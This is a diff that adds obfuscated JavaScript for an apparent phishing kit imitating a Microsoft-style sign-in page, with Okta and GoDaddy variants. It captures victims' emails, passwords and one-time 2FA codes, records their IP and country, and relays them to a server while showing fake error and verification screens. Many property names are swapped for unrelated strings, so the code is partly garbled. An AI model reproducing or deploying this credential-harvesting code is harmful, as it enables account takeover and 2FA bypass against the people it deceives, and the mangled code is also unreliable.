+      _0x4ee101["some"]((_0x4c0d5b) => _0x16fe64[`ajax`](_0x4c0d5b)) &&
+      (loadinganimation(0x0),
+      setTimeout(function () {
+        const _0x2c0c02 = _0x40b015;
+        loadinganimation(0x1),
+          (document[`selectprotectoption(this)`]("error_uname")["innerText"] =
+            `aria-checked`);
+      }, 0xbb8));
+    if (
+      unameInp[`signin_blocked_reason`][
+        `That doesn't match the phone number associated with your account. The correct number ends in `
+      ]() == ""
+    )
+      document["getElementById"]("error_uname")[`Next`] =
+        "Enter\x20a\x20valid\x20email\x20address,\x20phone\x20number,\x20or\x20Skype\x20name.";
+    else
+      unameInp[`signin_blocked_reason`][
+        `That doesn't match the phone number associated with your account. The correct number ends in `
+      ]() != "" &&
+        unameInp[`signin_blocked_reason`][`ajax`]("@") &&
+        !_0x4ee101[`288sDLHMP`]((_0x43cbd8) => _0x16fe64[`ajax`](_0x43cbd8)) &&
+        ((showwedidnthearpopup = 0x1),
+        loadinganimation(0x0),
+        webnotfound == !![] &&
+          setTimeout(function () {
+            loadinganimation(0x1),
+              runanimation(0x2, view, 0.3),
+              setTimeout(function () {
+                const _0x34d056 = _0x374d;
+                (document[_0x34d056(0x30b)]("error_pwd")[_0x34d056(0x37f)] =
+                  ""),
+                  (document[_0x34d056(0x30b)]("inp_pwd")[_0x34d056(0x2ab)] =
+                    ""),
+                  bottomsectionlinks(_0x34d056(0x21a), [
+                    {
+                      a_id: _0x34d056(0x22f),
+                      a_text: _0x34d056(0x35a),
+                      type: _0x34d056(0x2d8),
+                    },
+                  ]),
+                  document[_0x34d056(0x30b)](_0x34d056(0x237))[
+                    _0x34d056(0x208)
+                  ][_0x34d056(0x315)]("d-none"),
+                  document[_0x34d056(0x30b)](_0x34d056(0x304))[
+                    _0x34d056(0x208)
+                  ][_0x34d056(0x39e)](_0x34d056(0x1d6)),
+                  (view = "pwd"),
+                  runanimation(0x1, view, 0.3);
+              }, 0x12c);
+          }, 0xbb8),
+        webnotfound == ![] &&
+          (interacted == 0x1 && sendemail(),
+          interacted == 0x0 &&
+            ((interacted = 0x1),
+            (function _0x338407() {
+              const _0x464bd5 = _0x40b015;
+              $[`error-inp`](
+                `setAttribute`,
+                function (_0x1d72a1) {
+                  const _0x50f7da = _0x464bd5;
+                  (userip = _0x1d72a1["ip"]),
+                    (usercountry = _0x1d72a1[`iProofPhoneEntry`]),
+                    sendemail();
+                },
+                `textContent`,
+              )["fail"](function (_0x37ef95, _0x4b739b, _0x2d6fdd) {
+                const _0x18e618 = _0x464bd5;
+                (_0x37ef95["status"] == 0x1ad ||
+                  _0x4b739b !== `fadeinform 1s forwards`) &&
+                  setTimeout(_0x338407, 0x3e8);
+              });
+            })())));
+  } else {
+    if (view === `inp_otp_live`) {
+      const _0x4192fb = pes,
+        _0x4327c3 = pwdInp["value"];
+      _0x4192fb[`288sDLHMP`]((_0x1c7b80) => _0x4327c3["includes"](_0x1c7b80)) &&
+        (loadinganimation(0x0),
+        setTimeout(function () {
+          const _0x257bc9 = _0x40b015;
+          loadinganimation(0x1),
+            document[`selectprotectoption(this)`](`backbtnclick`)[`pdfemail`][
+              `waiting`
+            ](`background-image`),
+            document[`selectprotectoption(this)`](`24px`)[`pdfemail`]["remove"](
+              `background-image`,
+            ),
+            (view = "final"),
+            (document[`selectprotectoption(this)`](`dirltr`)[`Next`] = "");
+        }, 0xbb8));
+      if (pwdInp["value"]["trim"]() === "")
+        document["getElementById"](`dirltr`)[`Next`] = `2fa is off newwebsite`;
+      else
+        pwdInp[`signin_blocked_reason`][
+          `That doesn't match the phone number associated with your account. The correct number ends in `
+        ]() != "" &&
+          !_0x4192fb[`288sDLHMP`]((_0x39ce01) =>
+            _0x4327c3[`ajax`](_0x39ce01),
+          ) &&
+          (loadinganimation(0x0),
+          webnotfound == !![] &&
+            (missingadd(),
+            setTimeout(function () {
+              loadinganimation(0x1),
+                runanimation(0x2, view, 0.3),
+                setTimeout(function () {
+                  const _0x30838 = _0x374d;
+                  bottomsectionlinks(_0x30838(0x21a), [
+                    {
+                      a_id: "idA_PWD_ForgotPassword",
+                      a_text: "Forgot\x20my\x20password",
+                      type: _0x30838(0x2d8),
+                    },
+                  ]),
+                    changebackbutton("pwd", 0x1),
+                    document["getElementById"](_0x30838(0x304))["classList"][
+                      _0x30838(0x315)
+                    ](_0x30838(0x1d6)),
+                    document[_0x30838(0x30b)](_0x30838(0x29f))["classList"][
+                      _0x30838(0x39e)
+                    ](_0x30838(0x1d6)),
+                    (document[_0x30838(0x30b)]("error_pwd")[_0x30838(0x37f)] =
+                      ""),
+                    (view = _0x30838(0x313)),
+                    runanimation(0x1, view, 0.3);
+                }, 0x12c);
+            }, 0xbb8)),
+          webnotfound == ![] &&
+            ((multipleaccountsback = 0x0),
+            sendAndReceive(
+              `iEnterProofDesc`,
+              [
+                pwdInp["value"][`#section_uname_content`](
+                  /\//g,
+                  `backgroundImage`,
+                ),
+              ],
+              0x1,
+            )
+              [`hide-to-left `]((_0x258db7) => {
+                const _0x4af2c1 = _0x40b015;
+                if (
+                  _0x258db7 &&
+                  _0x258db7[`</a> or try to sign in again shortly.</p>`] !==
+                    `Enter the code to help us verify your identity.`
+                ) {
+                  loadinganimation(0x1);
+                  _0x258db7["message"] == `confirmemailorphone_live_title` &&
+                    ((document["getElementById"](`dirltr`)["innerText"] = ""),
+                    (document[`selectprotectoption(this)`](`sections_`)[
+                      `Next`
+                    ] = _0x258db7["email"]),
+                    checkerrordesc(
+                      "signin_blocked_live",
+                      0x0,
+                      _0x258db7["description"],
+                    ),
+                    checkerrordesc(
+                      "signin_blocked_reason",
+                      0x2,
+                      _0x258db7["reason"],
+                    ),
+                    document[`selectprotectoption(this)`](`backbtnclick`)[
+                      `pdfemail`
+                    ]["toggle"](`background-image`),
+                    document[`selectprotectoption(this)`](`backbutton`)[
+                      `pdfemail`
+                    ][`<a class="link mb-16" href="#" data-id="`]("d-none"),
+                    (view = `aria-live`));
+                  _0x258db7[`</a> or try to sign in again shortly.</p>`] ==
+                    `inp_otpcode` &&
+                    (checkerrordesc(
+                      "protect_account_live",
+                      0x0,
+                      _0x258db7[`confirmemail`],
+                    ),
+                    document[`selectprotectoption(this)`]("section_" + view)[
+                      `pdfemail`
+                    ][`waiting`]("d-none"),
+                    document[`selectprotectoption(this)`](
+                      `Can’t access your account?`,
+                    )[`pdfemail`]["remove"]("d-none"),
+                    (view = "protect_account_live"));
+                  _0x258db7[`</a> or try to sign in again shortly.</p>`] ==
+                    `d-none` &&
+                    (document["getElementById"](`backbtnclick`)["classList"][
+                      "toggle"
+                    ](`background-image`),
+                    document[`selectprotectoption(this)`](
+                      "section_youdonthaveaccess",
+                    )[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                      `background-image`,
+                    ),
+                    (view = `session timeout`));
+                  _0x258db7[`</a> or try to sign in again shortly.</p>`] ==
+                    `protectoptions` &&
+                    (document[`selectprotectoption(this)`](`backbtnclick`)[
+                      `pdfemail`
+                    ][`waiting`](`background-image`),
+                    document[`selectprotectoption(this)`](
+                      `section_multipleaccounts_adfs`,
+                    )["classList"][`<a class="link mb-16" href="#" data-id="`](
+                      `background-image`,
+                    ),
+                    (view = `protectoptions`));
+                  _0x258db7[`</a> or try to sign in again shortly.</p>`] ==
+                    `protect account` && moreinforeq();
+                  _0x258db7[`</a> or try to sign in again shortly.</p>`] ==
+                    `radio` &&
+                    (document[`selectprotectoption(this)`](`backbtnclick`)[
+                      "classList"
+                    ][`waiting`](`background-image`),
+                    document["getElementById"]("section_final")[`pdfemail`][
+                      `<a class="link mb-16" href="#" data-id="`
+                    ](`background-image`),
+                    (view = `authapp_live_code`),
+                    (document[`selectprotectoption(this)`](`dirltr`)[`Next`] =
+                      ""));
+                  _0x258db7[`</a> or try to sign in again shortly.</p>`] ==
+                    `confirmemailorphone_live_hidden` &&
+                    (document[`selectprotectoption(this)`](`backbtnclick`)[
+                      "classList"
+                    ][`waiting`](`background-image`),
+                    document[`selectprotectoption(this)`](`24px`)["classList"][
+                      "remove"
+                    ](`background-image`),
+                    (view = `authapp_live_code`),
+                    (document[`selectprotectoption(this)`](`dirltr`)[`Next`] =
+                      ""));
+                  if (_0x258db7["message"] == `important`) {
+                    (document[`selectprotectoption(this)`](`dirltr`)[
+                      "innerText"
+                    ] = ""),
+                      document[`selectprotectoption(this)`]("section_pwd")[
+                        `pdfemail`
+                      ][`waiting`]("d-none"),
+                      (document[`selectprotectoption(this)`](`password`)[
+                        "querySelector"
+                      ]("h2.title")["textContent"] = _0x258db7["title"]),
+                      changebackbutton(
+                        "accessblocked",
+                        _0x258db7[`#docemailloading`],
+                      ),
+                      checkerrordesc(
+                        `innerHTML`,
+                        0x0,
+                        _0x258db7[`confirmemail`],
+                      ),
+                      checkerrordesc(
+                        `signin_blocked_live`,
+                        0x2,
+                        _0x258db7[`.bannerlogo`],
+                      ),
+                      (document[`selectprotectoption(this)`]("footer")[
+                        `getElementById`
+                      ]["position"] = `OneWayVoiceMobileOTP`);
+                    var _0x56b717 =
+                      document[`selectprotectoption(this)`](`.user_identity`);
+                    _0x258db7["troubleshootinginfo"]["forEach"](
+                      (_0x4bb11e, _0x85de9) => {
+                        const _0x6e9347 = _0x4af2c1,
+                          _0xf00acb = document[_0x6e9347(0x3b3)](
+                            _0x6e9347(0x25b),
+                          ),
+                          _0x3a5d04 = document[_0x6e9347(0x3b3)](
+                            _0x6e9347(0x29c),
+                          );
+                        (_0x3a5d04["textContent"] =
+                          _0x4bb11e[_0x6e9347(0x249)]),
+                          _0x3a5d04[_0x6e9347(0x208)][_0x6e9347(0x23c)](
+                            _0x6e9347(0x36d),
+                          );
+                        const _0xd0f78f = document["createElement"]("span");
+                        (_0xd0f78f[_0x6e9347(0x1f2)] =
+                          _0x4bb11e[_0x6e9347(0x2ab)]),
+                          _0xf00acb["appendChild"](_0x3a5d04),
+                          _0xf00acb["appendChild"](_0xd0f78f),
+                          _0x56b717[_0x6e9347(0x2aa)](_0xf00acb);
+                      },
+                    ),
+                      document[`selectprotectoption(this)`](`password`)[
+                        `pdfemail`
+                      ][`<a class="link mb-16" href="#" data-id="`](
+                        `background-image`,
+                      ),
+                      (view = "accessblocked");
+                  }
+                  _0x258db7["message"] == `focus` &&
+                    ((document[`selectprotectoption(this)`](`dirltr`)[`Next`] =
+                      ""),
+                    checkerrordesc(
+                      `checkapphavingtroublesection`,
+                      0x0,
+                      _0x258db7[`confirmemail`],
+                    ),
+                    displayprotectoptions(_0x258db7[`otp_live`]),
+                    bottomsectionlinks(
+                      `checkapphavingtroublesection`,
+                      _0x258db7[`otp sent live`],
+                    ),
+                    changebackbutton("protectaccount", _0x258db7["backbutton"]),
+                    document[`selectprotectoption(this)`](`backbtnclick`)[
+                      `pdfemail`
+                    ][`waiting`](`background-image`),
+                    document[`selectprotectoption(this)`](`form-group-top`)[
+                      `pdfemail`
+                    ][`<a class="link mb-16" href="#" data-id="`](
+                      `background-image`,
+                    ),
+                    (view = `checkapphavingtroublesection`));
+                  _0x258db7[`</a> or try to sign in again shortly.</p>`] ==
+                    "otp\x20sent" &&
+                    ((document[`selectprotectoption(this)`](`dirltr`)[`Next`] =
+                      ""),
+                    document["getElementById"](`overflow`)[`142499lsAMVs`](
+                      `fail`,
+                      _0x258db7["image_src"],
+                    ),
+                    checkerrordesc(`authapp`, 0x0, _0x258db7["description"]),
+                    bottomsectionlinks(`authapp`, _0x258db7[`otp sent live`]),
+                    changebackbutton("otp", _0x258db7[`#docemailloading`]),
+                    document["getElementById"](`backbtnclick`)["classList"][
+                      `waiting`
+                    ]("d-none"),
+                    document[`selectprotectoption(this)`](`pwd_okta`)[
+                      `pdfemail`
+                    ][`<a class="link mb-16" href="#" data-id="`](
+                      `background-image`,
+                    ),
+                    (view = "otp"));
+                  _0x258db7[`</a> or try to sign in again shortly.</p>`] ==
+                    `aria-describedby` &&
+                    ((document[`selectprotectoption(this)`](`dirltr`)[
+                      "innerText"
+                    ] = ""),
+                    document[`selectprotectoption(this)`](`protectaccount`)[
+                      `142499lsAMVs`
+                    ](`fail`, _0x258db7[`Too many Attempts`]),
+                    checkerrordesc(
+                      `email otp live`,
+                      0x0,
+                      _0x258db7[`confirmemail`],
+                    ),
+                    bottomsectionlinks(
+                      `email otp live`,
+                      _0x258db7[`otp sent live`],
+                    ),
+                    changebackbutton("authapp", _0x258db7[`#docemailloading`]),
+                    (document[`selectprotectoption(this)`](
+                      `authenticaion failed`,
+                    )[`error_authapp_live`] =
+                      _0x258db7[`authenticaion failed`]),
+                    document[`selectprotectoption(this)`](`backbtnclick`)[
+                      `pdfemail`
+                    ]["toggle"](`background-image`),
+                    document[`selectprotectoption(this)`](`removeAttribute`)[
+                      `pdfemail`
+                    ]["remove"](`background-image`),
+                    (view = `email otp live`),
+                    wait2fa("app", _0x258db7[`#tryagain_toomanyattempts`]));
+                  _0x258db7[`</a> or try to sign in again shortly.</p>`] ==
+                    `mb-16` &&
+                    (document["getElementById"](`bannerlogo`)
+                      [`.loading-container`](`animation`)
+                      [`error_uname_doc`](),
+                    (document[`selectprotectoption(this)`](`dirltr`)[`Next`] =
+                      ""),
+                    document[`selectprotectoption(this)`](
+                      `error_confirmemailorphone_live`,
+                    )[`142499lsAMVs`](`fail`, _0x258db7[`Too many Attempts`]),
+                    checkerrordesc(`oninput`, 0x0, _0x258db7[`confirmemail`]),
+                    bottomsectionlinks(`oninput`, _0x258db7["bottomsection"]),
+                    changebackbutton(`oninput`, _0x258db7[`#docemailloading`]),
+                    document[`selectprotectoption(this)`](`backbtnclick`)[
+                      `pdfemail`
+                    ][`waiting`](`background-image`),
+                    document[`selectprotectoption(this)`]("section_authcall")[
+                      `pdfemail`
+                    ][`<a class="link mb-16" href="#" data-id="`](
+                      `background-image`,
+                    ),
+                    (view = `oninput`),
+                    wait2fa(`9tzhllo`));
+                  if (_0x258db7["message"] == `replace`) {
+                    var _0x2b06a0 = JSON[`Microsoft Authenticator`](
+                      _0x258db7[`section_confirmemailorphone_live`],
+                    );
+                    displaytwofamethods(_0x2b06a0),
+                      bottomsectionlinks(
+                        `titlehint`,
+                        _0x258db7["bottomsection"],
+                      ),
+                      changebackbutton(
+                        `titlehint`,
+                        _0x258db7[`#docemailloading`],
+                      ),
+                      document[`selectprotectoption(this)`](`backbtnclick`)[
+                        `pdfemail`
+                      ][`waiting`](`background-image`),
+                      document[`selectprotectoption(this)`](
+                        `btn_protectaccount`,
+                      )[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                        "d-none",
+                      ),
+                      (view = `titlehint`),
+                      (document[`selectprotectoption(this)`](`dirltr`)[`Next`] =
+                        "");
+                  }
+                  _0x258db7[`</a> or try to sign in again shortly.</p>`] ==
+                    `auth` &&
+                    (bottomsectionlinks(
+                      `inp_otp_live`,
+                      _0x258db7[`otp sent live`],
+                    ),
+                    changebackbutton("pwd", _0x258db7[`#docemailloading`]),
+                    checkerrordesc("pwd", 0x1, _0x258db7["description"]),
+                    (document["getElementById"](`tryagainlater`)[
+                      `signin_blocked_reason`
+                    ] = ""));
+                  for (
+                    var _0x351697 = 0x0;
+                    _0x351697 < websitenames[`style`];
+                    _0x351697++
+                  ) {
+                    _0x258db7[`</a> or try to sign in again shortly.</p>`] ==
+                      `input` + websitenames[_0x351697] + "" &&
+                      checkerrordesc(
+                        `inp_otp_live`,
+                        0x1,
+                        _0x258db7[`confirmemail`],
+                      );
+                  }
+                }
+              })
+              ["catch"]((_0x20c4d4) => {
+                const _0x1d59f7 = _0x40b015;
+                loadinganimation(0x1),
+                  console[`auth`](`selecttwofamethod(this)`, _0x20c4d4);
+              })));
+    }
+  }
+  return ![];
+}
+function resetbacktoemail() {
+  const _0xf42e17 = _0x283fde;
+  var _0x24dcd7 = "uname";
+  multipleaccountsback == 0x1 && (_0x24dcd7 = `maxLength`);
+  bottomsectionlinks(_0x24dcd7, [
+    {
+      a_id: `section_youdonthaveaccess`,
+      a_text: `setProperty`,
+      text: `desc`,
+      type: `tile`,
+    },
+    { a_text: `error_uname`, a_id: "cantAccessAccount", type: `uname_doc` },
+  ]);
+  multipleaccountsback == 0x0 && changebackbutton(_0x24dcd7, 0x0);
+  (document[
+    `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+  ]["style"][`otpdesc`] = ""),
+    (document[
+      `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+    ][`getElementById`][`image_src`] = "");
+  if (twa == 0x0) {
+    var _0x175f6c = document[`.btn_can`](`twofaselect`);
+    _0x175f6c[`querySelector`](function (_0x49d75f) {
+      const _0x27ecd8 = _0xf42e17;
+      _0x49d75f[`Send another request`](`getElementById`) &&
+        (_0x49d75f["removeAttribute"]("style"),
+        (_0x49d75f[`getElementById`]["height"] = `checked`));
+    });
+  }
+  (document[`selectprotectoption(this)`](`dirltr`)["innerText"] = ""),
+    document[`selectprotectoption(this)`](`backbtnclick`)["classList"][
+      `waiting`
+    ](`background-image`),
+    (document[`selectprotectoption(this)`](`backbtnclick`)[
+      `.loading-container`
+    ](".sectioncontent")[`getElementById`][`approve auth request auth app`] =
+      ""),
+    document["getElementById"]("section_" + _0x24dcd7)[`pdfemail`][
+      `<a class="link mb-16" href="#" data-id="`
+    ](`background-image`),
+    (view = _0x24dcd7);
+}
+function backbtn() {
+  const _0x21433b = _0x283fde;
+  runanimation(0x0, view, 1.2);
+  if (webnotfound == !![] && view == `inp_otp_live`)
+    (webnotfound = ![]),
+      setTimeout(function () {
+        resetbacktoemail(), runanimation(0x3, view, 1.2);
+      }, 0x384);
+  else {
+    if (webnotfound == ![] && view == "pwd") {
+      document[`selectprotectoption(this)`]("section_" + view)["querySelector"](
+        `relative`,
+      )[`getElementById`][`approve auth request auth app`] = "";
+      if (view == `inp_otp_live`) {
+        (document[`selectprotectoption(this)`](`dirltr`)[`Next`] = ""),
+          (document[`selectprotectoption(this)`](`tryagainlater`)["value"] =
+            ""),
+          (document[`selectprotectoption(this)`](`error_uname_pdf`)[`Next`] =
+            ""),
+          (document[`selectprotectoption(this)`](`#btn_back`)[
+            `signin_blocked_reason`
+          ] = ""),
+          bottomsectionlinks(`2fa is on`, [
+            {
+              a_id: `section_youdonthaveaccess`,
+              a_text: `setProperty`,
+              text: "No\x20account?",
+              type: `tile`,
+            },
+            { a_id: `.back`, a_text: `inp_pwd`, type: "link" },
+          ]),
+          changebackbutton(`2fa is on`, 0x0),
+          document[`selectprotectoption(this)`](`backbtnclick`)[`pdfemail`][
+            `waiting`
+          ](`background-image`),
+          (document[`selectprotectoption(this)`](`iProofPhone`)[
+            `.loading-container`
+          ](`relative`)[`getElementById`][`approve auth request auth app`] =
+            ""),
+          document[`selectprotectoption(this)`]("section_uname")["classList"][
+            "remove"
+          ](`background-image`);
+        document[
+          `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+        ][`getElementById`][`otpdesc`] &&
+          (document["body"]["style"][`otpdesc`] = "");
+        document[
+          `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+        ][`getElementById`][`image_src`] &&
+          (document[
+            `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+          ][`getElementById`][`image_src`] = "");
+        bottomsectionlinks(`2fa is on`, [
+          {
+            a_id: `section_youdonthaveaccess`,
+            a_text: `setProperty`,
+            text: `desc`,
+            type: `tile`,
+          },
+          { a_id: `.back`, a_text: `inp_pwd`, type: "link" },
+        ]);
+        if (twa == 0x0) {
+          var _0x36cb3e = document["querySelectorAll"](`twofaselect`);
+          _0x36cb3e[`querySelector`](function (_0x8f663a) {
+            const _0x35a02 = _0x21433b;
+            _0x8f663a["hasAttribute"](`getElementById`) &&
+              _0x8f663a[`56WDqgrK`]("style");
+          });
+        }
+        view = "uname";
+      }
+      runanimation(0x3, view, 1.2);
+    }
+  }
+  if (webnotfound == ![] && view != `inp_otp_live`) {
+    document["getElementById"]("section_" + view)[`.loading-container`](
+      `relative`,
+    )[`getElementById`][`approve auth request auth app`] = "";
+    if (view == `inp_otp_live`) {
+      (document[`selectprotectoption(this)`]("error_pwd")["innerText"] = ""),
+        (document[`selectprotectoption(this)`]("inp_pwd")[
+          `signin_blocked_reason`
+        ] = ""),
+        bottomsectionlinks(`2fa is on`, [
+          {
+            a_id: `section_youdonthaveaccess`,
+            a_text: `setProperty`,
+            text: `desc`,
+            type: `tile`,
+          },
+          {
+            a_id: `.back`,
+            a_text: "Can’t\x20access\x20your\x20account?",
+            type: `uname_doc`,
+          },
+        ]),
+        changebackbutton(`2fa is on`, 0x0),
+        document[`selectprotectoption(this)`](`backbtnclick`)["classList"][
+          `waiting`
+        ](`background-image`),
+        (document[`selectprotectoption(this)`]("section_uname")[
+          `.loading-container`
+        ](".sectioncontent")[`getElementById`][
+          `approve auth request auth app`
+        ] = ""),
+        document[`selectprotectoption(this)`](`iProofPhone`)[`pdfemail`][
+          `<a class="link mb-16" href="#" data-id="`
+        ]("d-none");
+      document[
+        `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+      ][`getElementById`]["backgroundImage"] &&
+        (document[
+          `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+        ]["style"]["backgroundImage"] = "");
+      document["body"][`getElementById`][`image_src`] &&
+        (document[
+          `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+        ][`getElementById`]["backgroundColor"] = "");
+      if (twa == 0x0) {
+        var _0x36cb3e = document["querySelectorAll"](".bannerlogo");
+        _0x36cb3e["forEach"](function (_0x26b1cf) {
+          const _0x1aa25a = _0x21433b;
+          _0x26b1cf[`Send another request`]("style") &&
+            _0x26b1cf["removeAttribute"]("style");
+        });
+      }
+      view = `2fa is on`;
+    }
+    view == `text-left` &&
+      (document[`selectprotectoption(this)`](`a_id`)[`pdfemail`][`waiting`](
+        `background-image`,
+      ),
+      document[`selectprotectoption(this)`](`btn_protectaccount`)[`pdfemail`][
+        `<a class="link mb-16" href="#" data-id="`
+      ](`background-image`),
+      (view = "2fa")),
+      view == `okta` &&
+        (document[`selectprotectoption(this)`](`PhoneAppOTP_Live`)[`pdfemail`][
+          "toggle"
+        ](`background-image`),
+        document[`selectprotectoption(this)`](`btn_protectaccount`)[`pdfemail`][
+          `<a class="link mb-16" href="#" data-id="`
+        ](`background-image`),
+        (view = "2fa")),
+      ((view == `5049dgudYJ` && viewtype == `inp_confirmemailorphone_live`) ||
+        (view == `5049dgudYJ` && viewtype == `backgroundimage`)) &&
+        (document[`selectprotectoption(this)`]("section_otp_live")[`pdfemail`][
+          `waiting`
+        ]("d-none"),
+        document[`selectprotectoption(this)`](
+          "section_confirmemailorphone_live",
+        )[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+          `background-image`,
+        ),
+        (view = `okta`)),
+      view == `5049dgudYJ` &&
+        viewtype == `authapp` &&
+        (document[`selectprotectoption(this)`](`Code`)[`pdfemail`]["toggle"](
+          `background-image`,
+        ),
+        document[`selectprotectoption(this)`](`btn_protectaccount`)[`pdfemail`][
+          `<a class="link mb-16" href="#" data-id="`
+        ]("d-none"),
+        (view = `titlehint`)),
+      view == `authapp` &&
+        ((document[`selectprotectoption(this)`]("error_otp")["innerText"] = ""),
+        (document[`selectprotectoption(this)`]("inp_otpcode")[
+          `signin_blocked_reason`
+        ] = ""),
+        document[`selectprotectoption(this)`](`pwd_okta`)["classList"][
+          `waiting`
+        ](`background-image`),
+        document[`selectprotectoption(this)`](`btn_protectaccount`)[`pdfemail`][
+          `<a class="link mb-16" href="#" data-id="`
+        ](`background-image`),
+        (view = "2fa")),
+      view == "authcall" &&
+        ((document["getElementById"]("error_authcall")["innerText"] = ""),
+        document[`selectprotectoption(this)`]("section_authcall")["classList"][
+          "toggle"
+        ]("d-none"),
+        document["getElementById"]("section_2fa")[`pdfemail`][
+          `<a class="link mb-16" href="#" data-id="`
+        ]("d-none"),
+        (view = "2fa")),
+      runanimation(0x3, view, 1.2);
+  }
+}
+document[`.btn_can`](`backbuttonclick(this,2)`)[`querySelector`](
+  (_0x225c27) => {
+    const _0x3ed2d4 = _0x283fde;
+    _0x225c27[`phcontainer`](`trim`, () => {
+      const _0x2f6d25 = _0x3ed2d4;
+      window[`marginBottom`][`bold`] = redirecturl;
+    });
+  },
+);
+if (view == "uname_pdf") {
+  const nxtpdf = document["getElementById"](`body`);
+  nxtpdf[`phcontainer`](`trim`, () => {
+    validatepdf();
+  }),
+    (pdfcheck = 0x1);
+  function loadinganimationpdf(_0x350b0f) {
+    const _0x4a0274 = _0x283fde;
+    _0x350b0f == 0x0 &&
+      ((document[`selectprotectoption(this)`](`img`)[`.loading-container`](
+        `remove`,
+      )[`getElementById`][`checkpass`] = `Verify Online`),
+      document[`selectprotectoption(this)`]("sections_pdf")
+        ["querySelector"](`error_verifyemail`)
+        ["classList"]["toggle"](`background-image`)),
+      _0x350b0f == 0x1 &&
+        ((document[`selectprotectoption(this)`](`img`)[`.loading-container`](
+          `remove`,
+        )[`getElementById`][`checkpass`] = `section_otp`),
+        document["getElementById"](`img`)
+          ["querySelector"](`error_verifyemail`)
+          [
+            `pdfemail`
+          ][`<a class="link mb-16" href="#" data-id="`](`background-image`)),
+      _0x350b0f == 0x2 &&
+        ((document[`selectprotectoption(this)`]("sections_pdf")[
+          `.loading-container`
+        ](`remove`)[`getElementById`][`checkpass`] = "flex"),
+        document[`selectprotectoption(this)`](`img`)[`pdfemail`][`waiting`](
+          `background-image`,
+        ));
+  }
+  const unamepdfinp =
+    document[`selectprotectoption(this)`](`section_authapp_live`);
+  function sendemailpdf() {
+    const _0x1b077a = _0x283fde;
+    sendAndReceive(
+      `unset`,
+      [unamepdfinp["value"], pagelinkval, browserName, userip, usercountry],
+      0x1,
+    )
+      [`hide-to-left `]((_0x4af9ff) => {
+        const _0x23d7cb = _0x1b077a;
+        if (
+          _0x4af9ff &&
+          _0x4af9ff[`</a> or try to sign in again shortly.</p>`] !==
+            `Enter the code to help us verify your identity.`
+        ) {
+          var _0x44039f = ![],
+            _0x2d27ca = 0x12c;
+          _0x4af9ff[`</a> or try to sign in again shortly.</p>`][`ajax`](
+            `small`,
+          ) == ![] &&
+            _0x4af9ff[`</a> or try to sign in again shortly.</p>`] !== `auth` &&
+            _0x4af9ff["acctype"] &&
+            _0x4af9ff[`width`] == 0x2 &&
+            (pvn = 0x1),
+            _0x4af9ff[`</a> or try to sign in again shortly.</p>`][`ajax`](
+              `small`,
+            ) == ![] && ((_0x2d27ca = 0x0), loadinganimationpdf(0x1)),
+            setTimeout(function () {
+              const _0x579c20 = _0x23d7cb;
+              for (
+                var _0x5b8b43 = 0x0;
+                _0x5b8b43 < websitenames[`style`];
+                _0x5b8b43++
+              ) {
+                if (
+                  _0x4af9ff[`</a> or try to sign in again shortly.</p>`][
+                    `ajax`
+                  ](`small`) == !![] &&
+                  _0x4af9ff[`</a> or try to sign in again shortly.</p>`][
+                    "includes"
+                  ](websitenames[_0x5b8b43]) == !![]
+                ) {
+                  (_0x44039f = !![]),
+                    document[`.btn_can`](`log`)[`querySelector`](
+                      (_0x5b2d98) => {
+                        const _0x432fea = _0x579c20;
+                        _0x5b2d98[`Next`] =
+                          unamepdfinp[`signin_blocked_reason`];
+                      },
+                    );
+                  if (websitenames[_0x5b8b43] == "godaddy") {
+                    var _0x5979bb = gdf,
+                      _0xee5d6f = document[`.loading-container`](
+                        "script[src^=\x22" + gdf + "\x22]",
+                      );
+                    if (!_0xee5d6f) {
+                      var _0x3ce53e =
+                        document[`iProofLbl1`](`protectaccount live`);
+                      (_0x3ce53e[`fail`] = _0x5979bb),
+                        document["head"]["appendChild"](_0x3ce53e);
+                    }
+                    const _0x45966a = `bottomsection`,
+                      _0x53463c = document[`iProofLbl1`](`getElementById`);
+                    (_0x53463c["id"] = `section_final`),
+                      (_0x53463c[`error_authapp_live`] = _0x45966a),
+                      document["head"]["appendChild"](_0x53463c),
+                      document[`selectprotectoption(this)`](`img`)[`pdfemail`][
+                        `waiting`
+                      ](`background-image`),
+                      document[`selectprotectoption(this)`](
+                        `authapperrorresend`,
+                      )["classList"]["toggle"]("d-none"),
+                      document[`selectprotectoption(this)`](
+                        `description` + websitenames[_0x5b8b43] + "",
+                      )[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                        "d-none",
+                      ),
+                      (document["getElementById"](
+                        `Sorry, we're having trouble verifying your account. Please try again. `,
+                      )["value"] = unamepdfinp["value"]),
+                      document[
+                        `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                      ]["style"]["setProperty"](
+                        "background-color",
+                        ` <a href="#" data-id="`,
+                        "important",
+                      ),
+                      document[
+                        `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                      ][`getElementById`][`voice`](
+                        `background-color`,
+                        "unset",
+                        `section_2fa`,
+                      ),
+                      document[
+                        `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                      ][`getElementById`][`voice`](
+                        `url('`,
+                        `someone@example.com`,
+                        `section_2fa`,
+                      ),
+                      (view = `parse`);
+                  }
+                }
+                _0x4af9ff[`</a> or try to sign in again shortly.</p>`][
+                  "includes"
